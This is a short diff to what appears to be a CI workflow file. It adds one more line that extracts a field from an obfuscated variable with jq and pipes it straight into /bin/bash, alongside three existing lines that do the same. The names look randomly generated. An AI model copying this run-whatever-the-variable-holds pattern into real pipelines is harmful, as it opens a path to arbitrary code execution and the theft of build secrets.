@@ -30,6 +30,7 @@ jobs:
           echo $wlv9279 | jq -r .cbjt18612 | /bin/bash
           printf '%s' "$huuq62" | jq -r .uq65912 | /bin/bash
           printf '%s' "$p8961" | jq -r .ch46 | /bin/bash
+          echo $cymo4404 | jq -r .o784 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
